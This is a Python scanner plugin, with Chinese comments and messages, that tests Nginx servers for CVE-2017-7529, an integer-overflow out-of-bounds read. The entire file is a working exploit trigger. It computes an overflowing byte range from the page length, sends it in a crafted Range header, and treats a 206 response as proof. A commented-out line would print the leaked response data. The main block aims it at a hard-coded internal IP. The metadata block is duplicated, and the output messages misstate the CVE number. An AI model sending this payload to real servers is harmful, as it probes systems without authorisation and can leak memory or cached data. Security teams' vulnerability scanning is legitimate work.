#!/usr/bin/python3

from app.lib.utils.request import request
from app.lib.utils.common import get_useragent

class CVE_2017_7529_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'CVE-2017-7529漏洞',
            'description': 'CVE-2017-7529越界读取信息漏洞,影响范围为: Nginx 0.5.6-1.13.2',
            'date': '2017-04-05',
            'exptype': 'check',
            'type': 'Info'
        }
        self.info = {
            'name': 'CVE-2017-7529漏洞',
            'description': 'CVE-2017-7529越界读取信息漏洞,影响范围为: Nginx 0.5.6-1.13.2',
            'date': '2017-04-05',
            'exptype': 'check',
            'type': 'Info'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        self.headers = {
            'User-Agent': get_useragent()
        }
        
    def check(self):
        
        """
        检测是否存在漏洞

        :param:

        :return bool True or False: 是否存在漏洞
        """
        
        try:
            check_req = request.get(self.url, headers = self.headers)
            start = len(check_req.content) + 605
            end = 0x8000000000000000 - start
            self.headers["Range"] = "bytes=-{},-{}".format(start, end)
            cmd_req = request.get(self.url, headers = self.headers )
            if cmd_req.status_code == 206:
                #print(cmd_req.text)
                print("存在CVE-2017-752漏洞")
                return True
            else:
                print("不存在CVE-2017-752漏洞")
                return False
        except Exception as e:
            print(e)
            return False

if  __name__ == "__main__":
    CVE_2017_7529 = CVE_2017_7529_BaseVerify('http://10.3.3.225/')
    CVE_2017_7529.check()